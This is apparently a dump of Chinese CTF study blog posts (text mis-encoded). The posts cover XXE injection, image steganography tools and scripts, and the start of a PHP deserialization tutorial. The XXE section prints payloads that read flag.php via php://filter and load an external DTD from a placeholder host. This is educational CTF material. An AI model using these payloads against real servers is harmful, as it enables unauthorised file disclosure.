<h3 id="ä¸€ã€XXE-æ˜¯ä»€ä¹ˆ"><a href="#ä¸€ã€XXE-æ˜¯ä»€ä¹ˆ" class="headerlink" title="ä¸€ã€XXE æ˜¯ä»€ä¹ˆ"></a><strong>ä¸€ã€XXE æ˜¯ä»€ä¹ˆ</strong></h3><p>XXE(XML External Entity Injection) å…¨ç§°ä¸º XML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œå½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå°±å¯èƒ½å¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ¢æµ‹ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚</p>
<h3 id="äºŒã€å…³äºXML"><a href="#äºŒã€å…³äºXML" class="headerlink" title="äºŒã€å…³äºXML"></a><strong>äºŒã€å…³äºXML</strong></h3><p><a href="https://www.runoob.com/xml/xml-intro.html">æœ‰å…³XMLæ ¼å¼ç‚¹è¿™é‡Œ</a></p>
<h4 id="å…³äºDTD"><a href="#å…³äºDTD" class="headerlink" title="å…³äºDTD"></a>å…³äºDTD</h4><p>DTDï¼šDocument Type Definition å³æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚å¯ä»¥åµŒå…¥åœ¨XMLæ–‡æ¡£ä¸­(å†…éƒ¨å£°æ˜)ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹çš„æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­(å¤–éƒ¨å¼•ç”¨)ï¼Œç”±äºå…¶æ”¯æŒçš„æ•°æ®ç±»å‹æœ‰é™ï¼Œæ— æ³•å¯¹å…ƒç´ æˆ–å±æ€§çš„å†…å®¹è¿›è¡Œè¯¦ç»†è§„èŒƒï¼Œåœ¨å¯è¯»æ€§å’Œå¯æ‰©å±•æ€§æ–¹é¢ä¹Ÿæ¯”ä¸ä¸ŠXML Schemaã€‚</p>
<p>ä¸€èˆ¬è®¤ä¸ºæœ‰ä¸¤ç§å¼•ç”¨æˆ–å£°æ˜æ–¹å¼ï¼š</p>
<ul>
<li>å†…éƒ¨DTDï¼šå¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨XMLæ–‡æ¡£ä¸­ã€‚</li>
<li>å¤–éƒ¨DTDï¼šå¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨ä¸€ä¸ªç‹¬ç«‹çš„DTDæ–‡ä»¶ï¼ˆ.dtdï¼‰ä¸­ã€‚</li>
</ul>
<p><strong>å†…éƒ¨å®ä½“</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b <span class="meta-string">&quot;123456&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line"><span class="comment">&lt;!-- 123456 --&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>å†…éƒ¨å‚æ•°å®ä½“</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="meta-string">&quot;&lt;!ENTITY b1 &quot;</span>123456<span class="meta-string">&quot;&gt;&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line"><span class="comment">&lt;!-- 123456 --&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‚æ•°å®ä½“ç”¨<code>% name</code>ç”³æ˜ï¼Œå¼•ç”¨æ—¶ç”¨<code>%name;</code>ï¼Œåªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼ŒDTDä¸­å¼•ç”¨ï¼›å…¶ä½™å®ä½“ç›´æ¥ç”¨<code>name</code>ç”³æ˜ï¼Œå¼•ç”¨æ—¶ç”¨<code>&amp;name;</code>ï¼Œåªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼Œå¯åœ¨xmlæ–‡æ¡£ä¸­å¼•ç”¨ã€‚</p>
<p><strong>å¤–éƒ¨å®ä½“</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line"><span class="comment">&lt;!-- ZmxhZ3tmMTRnXzFzX2hlcmV9 --&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>å¤–éƒ¨å‚æ•°å®ä½“</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx.xxx.xxx/xml.dtd&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line"><span class="comment">&lt;!-- ZmxhZ3tmMTRnXzFzX2hlcmV9 --&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;xml.dtd --&gt;</span><br><span class="line">&lt;!ENTITY b1 SYSTEM &quot;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZmxhZ3tmMTRnXzFzX2hlcmV9&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="ä¸‰ã€XXEåº”ç”¨"><a href="#ä¸‰ã€XXEåº”ç”¨" class="headerlink" title="ä¸‰ã€XXEåº”ç”¨"></a>ä¸‰ã€XXEåº”ç”¨</h3>]]></content>
      <categories>
        <category>webæ¼æ´</category>
      </categories>
  </entry>
  <entry>
    <title>æœ‰å…³å›¾ç‰‡éšå†™çš„å­¦ä¹ </title>
    <url>/2021/07/22/%E5%85%B3%E4%BA%8E%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h3 id="ä¸€ã€é™„åŠ å¼å›¾ç‰‡éšå†™"><a href="#ä¸€ã€é™„åŠ å¼å›¾ç‰‡éšå†™" class="headerlink" title="ä¸€ã€é™„åŠ å¼å›¾ç‰‡éšå†™"></a>ä¸€ã€é™„åŠ å¼å›¾ç‰‡éšå†™</h3><p>è¿™ç§éšå†™æ–¹å¼é€šå¸¸æ˜¯ä½¿ç”¨æŸç§æ–¹å¼åœ¨è½½ä½“æ–‡ä»¶ä¸­ç›´æ¥é™„åŠ ä¸Šè¦è¢«éšå†™çš„ä¿¡æ¯ã€‚</p>
<p>åœ¨CTFä¸­ï¼Œè¿™ç±»å›¾ç‰‡éšå†™å¤§æ¦‚æœ‰ä¸¤ç§ç»å…¸æ–¹å¼ï¼š</p>
<p>â€‹        1ã€ç›´æ¥é™„åŠ å­—ç¬¦ä¸²</p>
<p>â€‹        2ã€å›¾ç§å½¢å¼çš„éšå†™</p>
<h4 id="é™„åŠ å­—ç¬¦ä¸²"><a href="#é™„åŠ å­—ç¬¦ä¸²" class="headerlink" title="é™„åŠ å­—ç¬¦ä¸²"></a>é™„åŠ å­—ç¬¦ä¸²</h4><p>è¿™ç§ç±»å‹å¯ä»¥ç”¨stringså‘½ä»¤æ¥æŸ¥æ‰¾</p>
<p>å…³äºstringså‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stringså‘½ä»¤åœ¨å¯¹è±¡æ–‡ä»¶æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾å¯æ‰“å°çš„å­—ç¬¦ä¸²ã€‚å­—ç¬¦ä¸²æ˜¯4ä¸ªæˆ–æ›´å¤šå¯æ‰“å°å­—ç¬¦çš„ä»»æ„åºåˆ—ï¼Œä»¥æ¢è¡Œç¬¦æˆ–ç©ºå­—ç¬¦ç»“æŸã€‚ stringså‘½ä»¤å¯¹è¯†åˆ«éšæœºå¯¹è±¡æ–‡ä»¶å¾ˆæœ‰ç”¨ã€‚</span><br><span class="line"></span><br><span class="line">ç”¨æ³•ï¼šstrings [é€‰é¡¹] [æ–‡ä»¶]</span><br><span class="line"> æ‰“å° [æ–‡ä»¶] (é»˜è®¤ä¸ºæ ‡å‡†è¾“å…¥) ä¸­å¯æ‰“å°çš„å­—ç¬¦ä¸²</span><br><span class="line"> é€‰é¡¹ä¸ºï¼š</span><br><span class="line">-a --allï¼šæ‰«ææ•´ä¸ªæ–‡ä»¶è€Œä¸æ˜¯åªæ‰«æç›®æ ‡æ–‡ä»¶åˆå§‹åŒ–å’Œè£…è½½æ®µ</span><br><span class="line">-f â€“print-file-nameï¼šåœ¨æ˜¾ç¤ºå­—ç¬¦ä¸²å‰å…ˆæ˜¾ç¤ºæ–‡ä»¶å</span><br><span class="line">-t --radix&#x3D;&#123;o,d,x&#125; ï¼šè¾“å‡ºå­—ç¬¦çš„ä½ç½®ï¼ŒåŸºäºå…«è¿›åˆ¶ï¼Œåè¿›åˆ¶æˆ–è€…åå…­è¿›åˆ¶</span><br><span class="line">-e --encoding&#x3D;&#123;s,S,b,l,B,L&#125; ï¼šé€‰æ‹©å­—ç¬¦å¤§å°å’Œæ’åˆ—é¡ºåº:s &#x3D; 7-bit, S &#x3D; 8-bit, &#123;b,l&#125; &#x3D; 16-bit, &#123;B,L&#125; &#x3D; 32-bit</span><br><span class="line"></span><br><span class="line">-d --data                 Only scan the data sections in the file</span><br><span class="line">-n --bytes&#x3D;[number]       Locate &amp; print any NUL-terminated sequence of at</span><br><span class="line">-&lt;number&gt;                   least [number] characters (default 4).</span><br><span class="line">-w --include-all-whitespace Include all whitespace as valid string characters</span><br><span class="line">-o                        An alias for --radix&#x3D;o</span><br><span class="line">-T --target&#x3D;&lt;BFDNAME&gt;     Specify the binary file format</span><br><span class="line">-s --output-separator&#x3D;&lt;string&gt; String used to separate strings in output.</span><br><span class="line">@&lt;file&gt;                   Read options from &lt;file&gt;</span><br><span class="line">-h --help                 Display this information</span><br><span class="line">-v -V --version           Print the program&#39;s version number</span><br><span class="line">stringsï¼šæ”¯æŒçš„ç›®æ ‡ï¼š elf64-x86-64 elf32-i386 elf32-iamcu elf32-x86-64 pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big pe-x86-64 pe-bigobj-x86-64 pe-i386 srec symbolsrec verilog tekhex binary ihex plugin</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚<code>strings 1.jpg |grep flag</code>æŸ¥æ‰¾1.jpgä¸­å¯æ‰“å°å­—ç¬¦ä¸²ä¸­å«æœ‰flagçš„å­—ç¬¦ä¸²</p>
<p>è¿™ç§ç±»å‹ä¸€èˆ¬æ˜¯å°†ä¿¡æ¯æ’åˆ°å›¾ç‰‡çš„å°¾éƒ¨ï¼Œå°‘æ•°æ˜¯æ’åˆ°ä¸­é—´ã€‚</p>
<h4 id="å›¾ç§å½¢å¼çš„éšå†™"><a href="#å›¾ç§å½¢å¼çš„éšå†™" class="headerlink" title="å›¾ç§å½¢å¼çš„éšå†™"></a>å›¾ç§å½¢å¼çš„éšå†™</h4><p>å›¾ç§è¿™æ˜¯ä¸€ç§ä»¥å›¾ç‰‡æ–‡ä»¶ä¸ºè½½ä½“ï¼Œé€šå¸¸ä¸ºjpgæ ¼å¼çš„å›¾ç‰‡ï¼Œç„¶åå°†zipç­‰å‹ç¼©åŒ…æ–‡ä»¶é™„åŠ åœ¨å›¾ç‰‡æ–‡ä»¶åé¢ã€‚å› ä¸ºæ“ä½œç³»ç»Ÿè¯†åˆ«çš„è¿‡ç¨‹ä¸­æ˜¯ï¼Œä»æ–‡ä»¶å¤´æ ‡å¿—ï¼Œåˆ°æ–‡ä»¶çš„ç»“æŸæ ‡å¿—ä½ï¼Œå½“ç³»ç»Ÿè¯†åˆ«åˆ°å›¾ç‰‡çš„ç»“æŸæ ‡å¿—ä½åï¼Œé»˜è®¤æ˜¯ä¸å†ç»§ç»­è¯†åˆ«çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨é€šå¸¸æƒ…å†µä¸‹åªèƒ½çœ‹åˆ°å®ƒæ˜¯åªæ˜¯ä¸€å¼ å›¾ç‰‡ã€‚</p>
<p>åˆ©ç”¨Linuxä¸­çš„binwalkå‘½ä»¤å³å¯è¯†åˆ«æ­¤å›¾ç‰‡æ–‡ä»¶éƒ½åŒ…å«äº†ä»€ä¹ˆæ–‡ä»¶    æŸ¥è¯¢å‘½ä»¤<code>binwalk 1.jpg</code>åˆ†ç¦»å‘½ä»¤<code>binwalk -e 1.jpg</code></p>
<p>åˆ†ç¦»æ–‡ä»¶ä¹Ÿå¯ç”¨foremost <code>foremost 1.jpg</code></p>
<p>binwalkå¯ä»¥è‡ªåŠ¨è¯†åˆ«å‡ºå›¾ç‰‡ä¸­è—çš„zipæ–‡ä»¶ä»¥åŠæ˜¾ç¤ºå‡ºåç§»ï¼Œbinwalkå‘½ä»¤è¿˜å¯ä»¥è§£å‹zilbæ•°æ®</p>
<p>ä¸æƒ³ç”¨å‘½ä»¤çš„è¯å¯ä»¥ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰‹åŠ¨æå–å‡ºå‹ç¼©åŒ…ï¼Œè¿™å°±è¦æ±‚äº†è¦ç†Ÿæ‚‰å„ç§å¸¸è§æ–‡ä»¶çš„æ–‡ä»¶å¤´æ ‡è¯†å’Œç»“æŸæ ‡è¯†ï¼ˆè‡ªè¡Œç™¾åº¦</p>
<h3 id="äºŒã€åŸºäºæ–‡ä»¶ç»“æ„çš„å›¾ç‰‡éšå†™"><a href="#äºŒã€åŸºäºæ–‡ä»¶ç»“æ„çš„å›¾ç‰‡éšå†™" class="headerlink" title="äºŒã€åŸºäºæ–‡ä»¶ç»“æ„çš„å›¾ç‰‡éšå†™"></a>äºŒã€åŸºäºæ–‡ä»¶ç»“æ„çš„å›¾ç‰‡éšå†™</h3><p>ä¸»è¦ä»‹ç»å…³äºpngå›¾ç‰‡çš„éšå†™ï¼Œ<a href="https://ctf-wiki.org/misc/picture/png/">å…³äºpngæ–‡ä»¶ç»“æ„æˆ³è¿™é‡Œ</a></p>
<p>é‡ç‚¹äº†è§£ä¸€ä¸‹pngå›¾ç‰‡æ–‡ä»¶å¤´æ•°æ®å—ä»¥åŠpngå›¾ç‰‡IDATå—ï¼Œè¿™æ¬¡çš„éšå†™ä¹Ÿæ˜¯ä»¥è¿™ä¸¤ä¸ªåœ°æ–¹ä¸ºåŸºç¡€çš„ã€‚</p>
<p><strong>pngå›¾ç‰‡æ–‡ä»¶å¤´æ•°æ®å—ï¼ˆIHDRï¼‰</strong></p>
<p>IHDRä¸­ï¼ŒåŒ…æ‹¬äº†å›¾ç‰‡çš„å®½ï¼Œé«˜ï¼Œå›¾åƒæ·±åº¦ï¼Œé¢œè‰²ç±»å‹ï¼Œå‹ç¼©æ–¹æ³•ç­‰</p>
<p><strong>IDATæ•°æ®å—</strong></p>
<p>å®ƒå­˜å‚¨å®é™…çš„æ•°æ®ï¼Œåœ¨æ•°æ®æµä¸­å¯åŒ…å«å¤šä¸ªè¿ç»­é¡ºåºçš„å›¾åƒæ•°æ®å—ã€‚è¿™æ˜¯ä¸€ä¸ªå¯ä»¥å­˜åœ¨å¤šä¸ªæ•°æ®å—ç±»å‹çš„æ•°æ®å—ã€‚å®ƒçš„ä½œç”¨å°±æ˜¯å­˜å‚¨ç€å›¾åƒçœŸæ­£çš„æ•°æ®ã€‚å› ä¸ºå®ƒæ˜¯å¯ä»¥å­˜åœ¨å¤šä¸ªçš„ï¼Œæ‰€ä»¥å³ä½¿æˆ‘ä»¬å†™å…¥ä¸€ä¸ªå¤šä½™çš„IDATä¹Ÿä¸ä¼šå¤šå¤§å½±å“è‚‰çœ¼å¯¹å›¾ç‰‡çš„è§‚å¯Ÿ</p>
<h4 id="é«˜åº¦è¢«ä¿®æ”¹å¯¼è‡´çš„éšå†™"><a href="#é«˜åº¦è¢«ä¿®æ”¹å¯¼è‡´çš„éšå†™" class="headerlink" title="é«˜åº¦è¢«ä¿®æ”¹å¯¼è‡´çš„éšå†™"></a>é«˜åº¦è¢«ä¿®æ”¹å¯¼è‡´çš„éšå†™</h4><p>å›¾ç‰‡çš„é«˜åº¦ï¼Œå®½åº¦çš„å€¼å­˜æ”¾äºPNGå›¾ç‰‡çš„æ–‡ä»¶å¤´æ•°æ®å—ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹PNGå›¾ç‰‡çš„é«˜åº¦å€¼ï¼Œæ¥å¯¹éƒ¨åˆ†ä¿¡æ¯è¿›è¡Œéšè—çš„ã€‚</p>
<p>è¾¨åˆ«ï¼šå›¾ç‰‡åœ¨Windowsç³»ç»Ÿä¸‹èƒ½æ­£å¸¸æ˜¾ç¤ºè€ŒLinuxç³»ç»Ÿä¸èƒ½æ­£å¸¸æ˜¾ç¤ºï¼Œè¿™æ—¶å€™å°±è¦è€ƒè™‘å›¾ç‰‡é«˜åº¦æ˜¯å¦è¢«ä¿®æ”¹äº†</p>
<p>æ¨èä¸€æ‰‹010editorï¼ˆä¸€ä¸ª16è¿›åˆ¶ç¼–è¾‘å™¨ï¼‰ï¼Œå¯ä»¥è¿è¡Œå›¾ç‰‡æ¨¡æ¿ï¼Œè¿è¡Œæ¨¡æ¿åå¯ä»¥è½»æ˜“çš„æ‰¾åˆ°å›¾ç‰‡çš„å„ä¸ªæ•°æ®å—ä½ç½®åŠå†…å®¹</p>
<p>çŸ¥é“é«˜åº¦è¢«ä¿®æ”¹åå¯ä»¥ç›´æ¥æ”¹å¤§é«˜åº¦ä¹Ÿå¯ä»¥ç”¨è„šæœ¬æ ¹æ®crcæ ¡éªŒå€¼çˆ†ç ´å‡ºæ¥</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">img = <span class="built_in">open</span>(<span class="string">&#x27;å›¾ç‰‡çš„ç»å¯¹è·¯å¾„&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFFFF</span>):</span><br><span class="line">    stream = img[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + img[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc = binascii.crc32(stream)</span><br><span class="line">    <span class="keyword">if</span> crc == bytes_to_long(img[<span class="number">29</span>:<span class="number">33</span>]):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i))<span class="comment">#è¾“å‡ºé«˜åº¦çš„åå…­è¿›åˆ¶</span></span><br></pre></td></tr></table></figure>

<h4 id="éšå†™ä¿¡æ¯ä»¥IDATå—åŠ å…¥å›¾ç‰‡"><a href="#éšå†™ä¿¡æ¯ä»¥IDATå—åŠ å…¥å›¾ç‰‡" class="headerlink" title="éšå†™ä¿¡æ¯ä»¥IDATå—åŠ å…¥å›¾ç‰‡"></a>éšå†™ä¿¡æ¯ä»¥IDATå—åŠ å…¥å›¾ç‰‡</h4><p>å›¾ç‰‡çš„IDATå—æ˜¯å¯ä»¥å­˜åœ¨å¤šä¸ªçš„ï¼Œè¿™å¯¼è‡´äº†æˆ‘ä»¬å¯ä»¥å°†éšå†™ä¿¡æ¯ä»¥IDATå—çš„å½¢ä¼¼åŠ å…¥å›¾ç‰‡ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨pngcheckå¯¹å›¾ç‰‡è¿›è¡Œæ£€æµ‹  <a href="https://xz.aliyun.com/t/1836">å…·ä½“å®ä¾‹çœ‹è¿™é‡Œ</a></p>
<p>è¿™é‡Œä¸å†èµ˜è¿°</p>
<p>æˆ‘è‡ªå·±å‡ºäº†ä¸€ä¸ªé¢˜å¯ä»¥æ£€éªŒä¸€ä¸‹  <a href="https://pan.baidu.com/s/1xtG_UmazI6TV_WL1u41Gwg">é™„ä»¶ å¯†ç T0MR</a></p>
<h3 id="ä¸‰ã€LSBå›¾ç‰‡éšå†™"><a href="#ä¸‰ã€LSBå›¾ç‰‡éšå†™" class="headerlink" title="ä¸‰ã€LSBå›¾ç‰‡éšå†™"></a>ä¸‰ã€LSBå›¾ç‰‡éšå†™</h3><p><a href="https://ctf-wiki.org/misc/picture/png/#lsb">lsbä»‹ç»æˆ³è¿™é‡Œ</a></p>
<p>åœ¨ctfä¸­ï¼Œæœ€å¸¸ç”¨äºæ£€æµ‹lsbéšå†™çš„å·¥å…·ä¸ºstegsolve    ï¼ˆ<a href="http://t0mrvvi1b3t.top/2021/05/03/%E5%B7%A5%E5%85%B7/">è¿™é‡Œæœ‰</a></p>
<p>æå–rgbæœ€ä½ä½è„šæœ¬â€“<a href="https://xz.aliyun.com/t/1844">æ¥è‡ªè¿™é‡Œ</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;extracted.bmp&quot;</span>)</span><br><span class="line">pix = im.load()</span><br><span class="line">width, height = im.size</span><br><span class="line"></span><br><span class="line">extracted_bits = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):<span class="comment">#yï¼Œxä»£è¡¨çš„æ˜¯å›¾ç‰‡çš„é«˜ä»¥åŠå®½åº¦ï¼Œè¿›è¡Œä¸€ä¸ªå¾ªç¯æå–</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        r, g, b = pix[(x,y)]</span><br><span class="line">        extracted_bits.append(r &amp; <span class="number">1</span>)</span><br><span class="line">        extracted_bits.append(g &amp; <span class="number">1</span>)</span><br><span class="line">        extracted_bits.append(b &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">extracted_byte_bits = [extracted_bits[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(extracted_bits), <span class="number">8</span>)]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;extracted2.bmp&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    <span class="keyword">for</span> byte_bits <span class="keyword">in</span> extracted_byte_bits:</span><br><span class="line">                byte_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> byte_bits)</span><br><span class="line">        byte = <span class="built_in">chr</span>(<span class="built_in">int</span>(byte_str, <span class="number">2</span>))</span><br><span class="line">        out.write(byte)</span><br></pre></td></tr></table></figure>



<h3 id="å››ã€åŸºäºDCTåŸŸçš„JPGå›¾ç‰‡éšå†™"><a href="#å››ã€åŸºäºDCTåŸŸçš„JPGå›¾ç‰‡éšå†™" class="headerlink" title="å››ã€åŸºäºDCTåŸŸçš„JPGå›¾ç‰‡éšå†™"></a>å››ã€åŸºäºDCTåŸŸçš„JPGå›¾ç‰‡éšå†™</h3><p><a href="https://ctf-wiki.org/misc/picture/jpg/">å…³äºJPGæˆ³è¿™é‡Œ</a></p>
<p>å¸¸è§å…³äºJPGçš„éšå†™æ–¹æ³•æœ‰ JStegã€JPHideã€Outguessã€F5ç­‰ å¸¸ç”¨Stegdetectæ¥æ£€æµ‹æ˜¯å“ªç§éšå†™æ–¹å¼</p>
<p><a href="https://ctf-wiki.org/misc/picture/jpg/#stegdetect">å…³äºStegdetectå’ŒJPHSæˆ³è¿™é‡Œ</a>  <a href="https://www.codenong.com/cs106178858/">å‹ç¼©åŸç†åŠå·¥å…·ä½¿ç”¨æˆ³è¿™é‡Œ</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Stegdetect</span><br><span class="line">å¦‚æœæ£€æµ‹ç»“æœæ˜¾ç¤ºè¯¥æ–‡ä»¶å¯èƒ½åŒ…å«éšè—ä¿¡æ¯ï¼Œé‚£ä¹ˆStegdetectä¼šåœ¨æ£€æµ‹ç»“æœåé¢ä½¿ç”¨1ï½3é¢—æ˜Ÿæ¥æ ‡è¯†</span><br><span class="line">éšè—ä¿¡æ¯å­˜åœ¨çš„å¯èƒ½æ€§å¤§å°ï¼Œ3é¢—æ˜Ÿè¡¨ç¤ºéšè—ä¿¡æ¯å­˜åœ¨çš„å¯èƒ½æ€§æœ€å¤§ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="äº”ã€æ•°å­—æ°´å°éšå†™"><a href="#äº”ã€æ•°å­—æ°´å°éšå†™" class="headerlink" title="äº”ã€æ•°å­—æ°´å°éšå†™"></a>äº”ã€æ•°å­—æ°´å°éšå†™</h3><p><a href="https://www.jianshu.com/p/8a89b6ba5e39">LSBé¡ºåºæ›¿æ¢åµŒå…¥ä¸æå–å®ç°</a></p>
<p><a href="https://github.com/li-xin-yi/graduation-project/tree/master">åŠ å¼ºç‰ˆ</a></p>
]]></content>
      <categories>
        <category>Misc</category>
        <category>å›¾ç‰‡éšå†™</category>
      </categories>
  </entry>
  <entry>
    <title>ç»“åˆctfshowå­¦ä¹ phpååºåˆ—åŒ–</title>
    <url>/2021/05/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h2 id="PHPåºåˆ—åŒ–æ˜¯ä»€ä¹ˆ"><a href="#PHPåºåˆ—åŒ–æ˜¯ä»€ä¹ˆ" class="headerlink" title="PHPåºåˆ—åŒ–æ˜¯ä»€ä¹ˆ"></a>PHPåºåˆ—åŒ–æ˜¯ä»€ä¹ˆ</h2><h3 id="ä¸¤ä¸ªå‡½æ•°"><a href="#ä¸¤ä¸ªå‡½æ•°" class="headerlink" title="ä¸¤ä¸ªå‡½æ•°"></a>ä¸¤ä¸ªå‡½æ•°</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">serialize()     <span class="comment">//å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line">unserialize()   <span class="comment">//å°†å­—ç¬¦ä¸²è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">åœ¨phpä¸­ï¼Œå¯ä»¥å¯¹æ•°ç»„ï¼Œå˜é‡ï¼Œå¯¹è±¡ç­‰è¿›è¡Œåºåˆ—åŒ–ï¼ˆé™æ€å˜é‡ï¼Œå¸¸é‡ä¸ä¼šè¢«åºåˆ—åŒ–ï¼‰</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„åœ¨PHPä¸­è¿›è¡Œå¯¹è±¡çš„ä¼ é€’ã€‚æœ¬è´¨ä¸Šååºåˆ—åŒ–æ˜¯æ²¡æœ‰å±å®³çš„ã€‚ä½†æ˜¯å¦‚æœç”¨æˆ·å¯¹æ•°æ®å¯æ§é‚£å°±å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ„é€ payloadæ”»å‡»ã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
